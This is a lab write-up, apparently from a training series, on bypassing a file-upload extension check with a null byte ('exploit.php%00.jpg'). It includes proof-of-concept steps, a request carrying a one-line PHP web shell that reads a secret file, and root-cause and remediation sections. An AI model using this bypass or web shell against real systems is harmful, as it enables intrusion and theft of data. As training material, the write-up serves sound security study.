# Lab 05 — Web Shell Upload via Obfuscated File Extension

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20Null%20Byte%20Extension%20Bypass-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Web Shell Upload via Obfuscated File Extension |
| **Difficulty** | Practitioner |
| **Vulnerability Class** | File Upload — Null Byte Extension Bypass |
| **Weakness (CWE)** | CWE-434 / CWE-626: Null Byte Interaction Error |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The high-level application code validates that the filename ends with an approved image extension, operating on the full string. The underlying filesystem write (C-based) truncates the filename at the first null byte (`%00`), so a filename crafted as `exploit.php%00.jpg` is approved by the check (it "ends with .jpg") but is actually saved to disk as `exploit.php`.

## 3. Proof of Concept (PoC)

**Step 1 — Attempt a plain PHP upload:**  
Create and try uploading `exploit.php` — rejected, only JPG/PNG allowed.

**Step 2 — Capture the upload request:**  
Send `POST /my-account/avatar` to Burp Repeater.

**Step 3 — Inject the null byte in the filename:**  
In the `Content-Disposition` header, change the filename to:

```http
filename="exploit.php%00.jpg"
```

**Step 4 — Confirm the bypass:**  
Send the request. The upload succeeds — and the confirmation message refers to the file as `exploit.php`, confirming the null byte and fake extension were stripped during the save.

**Step 5 — Trigger the shell:**  
Request `GET /files/avatars/exploit.php` — returns Carlos's secret.


## 4. Evidence (Request / Response)

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

HTTP/1.1 200 OK
The file avatars/exploit.php has been uploaded.
```

## 5. Root Cause Analysis

A mismatch between how the high-level application code interprets the filename string (full length) and how the lower-level, C-based filesystem write function interprets it (null-terminated — stops at the first `\0`). The extension check passes on the untruncated string, but the actual saved filename is truncated before the fake extension.

### Attacker vs. Defender Perspective

- **Attacker view:** When an extension allow-list is enforced, try a URL-encoded null byte (%00) between the real extension and a fake approved one.
- **Defender view:** Patch runtimes affected by null-byte truncation, and never trust filename-based validation alone.

## 6. Impact

Complete bypass of extension-based allow-listing, enabling arbitrary file upload and remote code execution. Largely a historical PHP issue (patched in PHP ≥ 5.3.4) but still relevant in legacy stacks.

## 7. Remediation

- Upgrade to a modern language runtime where this null-byte truncation behavior is patched.
- Never rely on filename extension checks alone; validate actual file content server-side.
- Reject any filename containing a null byte outright before any further processing.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
